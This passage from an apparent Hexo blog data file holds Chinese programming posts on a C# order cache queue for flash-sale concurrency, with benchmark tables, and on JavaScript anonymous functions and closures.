/td>\n<td>10</td>\n<td>抢购</td>\n<td>2000人抢100个订单</td>\n<td>100</td>\n<td>api</td>\n<td>79.7</td>\n<td>1.33</td>\n<td>28738</td>\n<td>360.577</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>50</td>\n<td>并发购买</td>\n<td>50个人同时买2000种不同商品</td>\n<td>100000</td>\n<td>Handler</td>\n<td>3467</td>\n<td>57.78299471</td>\n<td>86.378</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>50</td>\n<td>并发购买</td>\n<td>50个人同时买2000种不同商品</td>\n<td>100000</td>\n<td>api</td>\n<td>3638</td>\n<td>60.63</td>\n<td>299375</td>\n<td>82.291</td>\n</tr>\n</tbody>\n</table>\n<p>从上图可以看出，在高并发情况下webapi的性能确实不行。</p>\n<h3 id=\"开发总结\"><a href=\"#开发总结\" class=\"headerlink\" title=\"开发总结\"></a>开发总结</h3><ul>\n<li>锁在高并发的情况下的使用，如何满足业务要求。</li>\n<li>缓存的使用，缓存与数据库之间的数据如何保持一致。</li>\n<li>对于大型电商网站，缓存队列需要设置上限，不然会引起内存问题，不过在这里不是这道题目的重点。</li>\n</ul>\n<p><a href=\"https://github.com/binyanbin/interview/\" target=\"_blank\" rel=\"external\">源码下载</a></p>\n","excerpt":"<p>15年年底去一家电商服务公司面试，其中有一道题目是如何解决电商站点商品秒杀的相关问题。<a href=\"https://github.com/hishopdc/dc2015\">面试题目可以参见</a>。固定的数据库结构下实现三个接口，查看、下单、付款。<br>","more":"</p>\n<h2 id=\"主要问题-高并发查询及更新数据库\"><a href=\"#主要问题-高并发查询及更新数据库\" class=\"headerlink\" title=\"主要问题:高并发查询及更新数据库\"></a>主要问题:高并发查询及更新数据库</h2><p>解决的方案其实比较其实并不复杂，也很常规。无非就是用缓存队列实现批量更新数据库。把下单的数据放入队列中，然后批量更新到数据库中去。说起来比较简单，实践中还是踩了一些坑。</p>\n<h3 id=\"主要实现逻辑\"><a href=\"#主要实现逻辑\" class=\"headerlink\" title=\"主要实现逻辑\"></a>主要实现逻辑</h3><p>订单处理类<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 订单缓存队列处理类</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">OrderCacheQuene</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 订单队列缓存</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> List&lt;Order&gt; _orders;</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 数据库操作接口</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> IPromotion _service;</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 锁</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">object</span> _locker = <span class=\"keyword\">new</span> <span class=\"keyword\">object</span>();</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 队列处理线程</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Thread _thread;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 订单队列启动</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Start</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        _thread = <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> ThreadStart(OrderDispose));</span><br><span class=\"line\">        _thread.Start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 缓存结束</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">End</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            _thread.Abort();</span><br><span class=\"line\">            _service.OrderTrans(_orders);</span><br><span class=\"line\">            _orders.Clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 下单</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">string</span> <span class=\"title\">OrderBuy</span>(<span class=\"params\">Order o</span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            _orders.Add(o);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> o.OrderId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 支付</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">bool</span> <span class=\"title\">OrderPay</span>(<span class=\"params\">RequestPay o, DateTime? paytime</span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        \tOrder order = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> index = _orders.FindIndex(t =&gt; t.OrderId == o.order_id &amp;&amp; t.UserId == o.uid);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (index &gt;= <span class=\"number\">0</span>)<span class=\"comment\"><span class=\"doctag\">///</span>已存在缓存中</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                _orders[index].PayTime = paytime;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;            \t</span><br><span class=\"line\">            order = _service.GetOrder(o.order_id);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (order == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"keyword\">else</span><span class=\"comment\"><span class=\"doctag\">///</span>已存在数据库中</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                order.PayTime = paytime;</span><br><span class=\"line\">                <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    _orders.Add(order);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 判断队列是否已满</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">bool</span> <span class=\"title\">isFull</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> _orders.Count &gt;= Constant.QueueMaxCount ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 订单队列处理事件</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">OrderDispose</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">//DateTime starttime = DateTime.Now;</span></span><br><span class=\"line\">            <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">               List&lt;Order&gt; orders =  _orders.Take(Constant.MaxOrderDispose).ToList();</span><br><span class=\"line\">                _service.OrderTrans(orders.ToList());<span class=\"comment\">//调用数据库接口处理订单</span></span><br><span class=\"line\">                <span class=\"keyword\">foreach</span> (Order o <span class=\"keyword\">in</span> orders)</span><br><span class=\"line\">                    _orders.Remove(o);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            Thread.Sleep(Constant.QueueDisposeTimeSpan);<span class=\"comment\">//每次处理完成休眠</span></span><br><span class=\"line\">            <span class=\"comment\">//DateTime endtime = DateTime.Now;</span></span><br><span class=\"line\">            <span class=\"comment\">//System.Diagnostics.Debug.WriteLine(\"Yanbin TimeSpan:\"+endtime.Subtract(starttime).Milliseconds);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>缓存我直接使用的静态对像，效果是一样的。批量提交的方法是 _service.OrderTrans，在这里就不列出来，但是一些数据库操作。</p>\n<p>订单队列启动与结束</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class WebApiApplication : System.Web.HttpApplication</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    protected void Application_Start()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //订单队列初始化</span><br><span class=\"line\">        OrderCacheQuene.Start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    protected void Application_End()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //结束处理</span><br><span class=\"line\">        OrderCacheQuene.End();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"坑1-超卖\"><a href=\"#坑1-超卖\" class=\"headerlink\" title=\"坑1:超卖\"></a>坑1:超卖</h3><p>程序实现以后，我写了一个测试程序去跑它，跑到200线程时超卖了，思来想去之后发现是判断的问题，开始下单时的判断条件没有放到订单队列程序里面。因为并发大，所以有一些客户端请求下单的时候,程序判断是满足下单条件,但是还有一些客户端的请求正在响应，把订单加入缓存了，造成判断不一致，最终引起超卖。所以下单的条件判断需要加到锁里面，虽然对性能上有一些损耗，但是可以保证不会超卖。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 下单</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">string</span> <span class=\"title\">OrderBuy</span>(<span class=\"params\">Order o</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (队列已满，已卖空，已下单等条件)</span><br><span class=\"line\">     \t<span class=\"keyword\">return</span> <span class=\"literal\">null</span>;            \t</span><br><span class=\"line\">        _orders.Add(o);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o.OrderId;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"坑2-效率坑\"><a href=\"#坑2-效率坑\" class=\"headerlink\" title=\"坑2:效率坑\"></a>坑2:效率坑</h3><p>做web接口，在.net的系统中当然用webapi,更种好处用过都知道，没想到在高并发的条件下效率不如handler。以下这些数据是在我这台旧的笔记本上测试出来的。</p>\n<table>\n<thead>\n<tr>\n<th>线程数</th>\n<th>线程调用接口数</th>\n<th>处理方式</th>\n<th>说明</th>\n<th>产生订单数</th>\n<th>接口方式</th>\n<th>完成时间(秒)</th>\n<th>完成时间(分钟)</th>\n<th>处理请求总数</th>\n<th>平均每秒处理请求</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>2000</td>\n<td>100</td>\n<td>只查询</td>\n<td>2000人同时查100种商品</td>\n<td>0</td>\n<td>handler</td>\n<td>650.5</td>\n<td>10.84</td>\n<td>199706</td>\n<td>307.004</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>100</td>\n<td>只查询</td>\n<td>2000人同时查100种商品</td>\n<td>0</td>\n<td>api</td>\n<td>1180.8</td>\n<td>19.68</td>\n<td>199747</td>\n<td>169.162</td>\n</tr>\n<tr>\n<td>1000</td>\n<td>50</td>\n<td>只查询</td>\n<td>1000人同时查50种商品</td>\n<td>0</td>\n<td>handler</td>\n<td>86.3</td>\n<td>1.44</td>\n<td>49932</td>\n<td>578.586</td>\n</tr>\n<tr>\n<td>1000</td>\n<td>50</td>\n<td>只查询</td>\n<td>1000人同时查50种商品</td>\n<td>0</td>\n<td>api</td>\n<td>103.9</td>\n<td>1.73</td>\n<td>49948</td>\n<td>480.731</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>10</td>\n<td>抢购</td>\n<td>2000人抢100个订单</td>\n<td>100</td>\n<td>handler</td>\n<td>81.9</td>\n<td>1.37</td>\n<td>40430</td>\n<td>493.651</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>10</td>\n<td>抢购</td>\n<td>2000人抢100个订单</td>\n<td>100</td>\n<td>api</td>\n<td>79.7</td>\n<td>1.33</td>\n<td>28738</td>\n<td>360.577</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>50</td>\n<td>并发购买</td>\n<td>50个人同时买2000种不同商品</td>\n<td>100000</td>\n<td>Handler</td>\n<td>3467</td>\n<td>57.78299471</td>\n<td>86.378</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>50</td>\n<td>并发购买</td>\n<td>50个人同时买2000种不同商品</td>\n<td>100000</td>\n<td>api</td>\n<td>3638</td>\n<td>60.63</td>\n<td>299375</td>\n<td>82.291</td>\n</tr>\n</tbody>\n</table>\n<p>从上图可以看出，在高并发情况下webapi的性能确实不行。</p>\n<h3 id=\"开发总结\"><a href=\"#开发总结\" class=\"headerlink\" title=\"开发总结\"></a>开发总结</h3><ul>\n<li>锁在高并发的情况下的使用，如何满足业务要求。</li>\n<li>缓存的使用，缓存与数据库之间的数据如何保持一致。</li>\n<li>对于大型电商网站，缓存队列需要设置上限，不然会引起内存问题，不过在这里不是这道题目的重点。</li>\n</ul>\n<p><a href=\"https://github.com/binyanbin/interview/\">源码下载</a></p>"},{"title":"Javascript的匿名函数","date":"2016-02-19T16:00:00.000Z","desc":"Javascript  匿名函数","_content":"匿名函数在javascript中非常常见且实用，它最大的用途是创建闭包（这是JavaScript语言的特性之一），并且还可以构建命名空间，以减少全局变量的使用。javascript的框架这种用法随处可见。下面看二个例子，如何定义匿名函数。\n<!-- more -->\n``` Javascript\n\tvar f = function(t){\n        alert(t);\n    };\n\tf(\"abc\");\n```\n“=”右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量f。通过f再调用这个匿名函数。\n\n``` Javascript\n\t(function(t){\n\t\talert(t)\n    })(\"abc\");\n```\n这里创建了一个匿名函数(在第一个括号内)，第二个括号用于调用该匿名函数，并传入参数。\n这就是匿名函数常用的使用方式，通常用得最多的是第二种。\n\n前端人员一般为了避免声明了一些全局变量而污染，把代码放在一个“沙箱执行”，然后在暴露出命名空间（可以为API，函数，对象）,如Jquery:\n\n``` Javascript\n\t(function( window, undefined ) {\n\t    window.jQuery = window.$ = jQuery;\n\t})( window );\n```\n\n再如我想建一个自己的框架叫yb:\n\n``` Javascript\n\t(function(window,undefined){\n\t\tvar yb = {\n\t\t\tadd:function(){\n\t\t\t\talert(\"add\");\n\t\t\t},\n\t\t\tsub:function(){\n\t\t\t\talert(\"sub\");\n\t\t\t}\n\t\t};\n\t\twindow.yb = yb;\n\t})(window);\n```\n你的方法add和sub只能通过全局对象yb访问，这个是函数闭包规则决定的。如不能理解闭包请参见[函数的闭包](http://binyanbin.github.io/2016/01/03/javascript-base-1/);\n\n\n\n\n\n","source":"_posts/javascript-base-2.md","raw":"---\ntitle: Javascript的匿名函数 \ndate: 2016-2-20\ndesc: Javascript  匿名函数 \n---\n匿名函数在javascript中非常常见且实用，它最大的用途是创建闭包（这是JavaScript语言的特性之一），并且还可以构建命名空间，以减少全局变量的使用。javascript的框架这种用法随处可见。下面看二个例子，如何定义匿名函数。\n<!-- more -->\n``` Javascript\n\tvar f = function(t){\n        alert(t);\n    };\n\tf(\"abc\");\n```\n“=”右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量f。通过f再调用这个匿名函数。\n\n``` Javascript\n\t(function(t){\n\t\talert(t)\n    })(\"abc\");\n```\n这里创建了一个匿名函数(在第一个括号内)，第二个括号用于调用该匿名函数，并传入参数。\n这就是匿名函数常用的使用方式，通常用得最多的是第二种。\n\n前端人员一般为了避免声明了一些全局变量而污染，把代码放在一个“沙箱执行”，然后在暴露出命名空间（可以为API，函数，对象）,如Jquery:\n\n``` Javascript\n\t(function( window, undefined ) {\n\t    window.jQuery = window.$ = jQuery;\n\t})( window );\n```\n\n再如我想建一个自己的框架叫yb:\n\n``` Javascript\n\t(function(window,undefined){\n\t\tvar yb = {\n\t\t\tadd:function(){\n\t\t\t\talert(\"add\");\n\t\t\t},\n\t\t\tsub:function(){\n\t\t\t\talert(\"sub\");\n\t\t\t}\n\t\t};\n\t\twindow.yb = yb;\n\t})(window);\n```\n你的方法add和sub只能通过全局对象yb访问，这个是函数闭包规则决定的。如不能理解闭包请参见[函数的闭包](http://binyanbin.github.io/2016/01/03/javascript-base-1/);\n\n\n\n\n\n","slug":"javascript-base-2","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llta000kg2x6o6vvqekn","content":"<p>匿名函数在javascript中非常常见且实用，它最大的用途是创建闭包（这是JavaScript语言的特性之一），并且还可以构建命名空间，以减少全局变量的使用。javascript的框架这种用法随处可见。下面看二个例子，如何定义匿名函数。<br><a id=\"more\"></a><br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> f = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">t</span>)</span>&#123;</span><br><span class=\"line\">       alert(t);</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\">f(<span class=\"string\">\"abc\"</span>);</span><br></pre></td></tr></table></figure></p>\n<p>“=”右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量f。通过f再调用这个匿名函数。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">t</span>)</span>&#123;</span><br><span class=\"line\">\talert(t)</span><br><span class=\"line\">   &#125;)(<span class=\"string\">\"abc\"</span>);</span><br></pre></td></tr></table></figure>\n<p>这里创建了一个匿名函数(在第一个括号内)，第二个括号用于调用该匿名函数，并传入参数。<br>这就是匿名函数常用的使用方式，通常用得最多的是第二种。</p>\n<p>前端人员一般为了避免声明了一些全局变量而污染，把代码放在一个“沙箱执行”，然后在暴露出命名空间（可以为API，函数，对象）,如Jquery:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> window, undefined </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.jQuery = <span class=\"built_in\">window</span>.$ = jQuery;</span><br><span class=\"line\">&#125;)( <span class=\"built_in\">window</span> );</span><br></pre></td></tr></table></figure>\n<p>再如我想建一个自己的框架叫yb:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">window,undefined</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> yb = &#123;</span><br><span class=\"line\">\t\tadd:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"add\"</span>);</span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\tsub:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"sub\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">window</span>.yb = yb;</span><br><span class=\"line\">&#125;)(<span class=\"built_in\">window</span>);</span><br></pre></td></tr></table></figure>\n<p>你的方法add和sub只能通过全局对象yb访问，这个是函数闭包规则决定的。如不能理解闭包请参见<a href=\"http://binyanbin.github.io/2016/01/03/javascript-base-1/\">函数的闭包</a>;</p>\n","excerpt":"<p>匿名函数在javascript中非常常见且实用，它最大的用途是创建闭包（这是JavaScript语言的特性之一），并且还可以构建命名空间，以减少全局变量的使用。javascript的框架这种用法随处可见。下面看二个例子，如何定义匿名函数。<br>","more":"<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> f = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">t</span>)</span>&#123;</span><br><span class=\"line\">       alert(t);</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\">f(<span 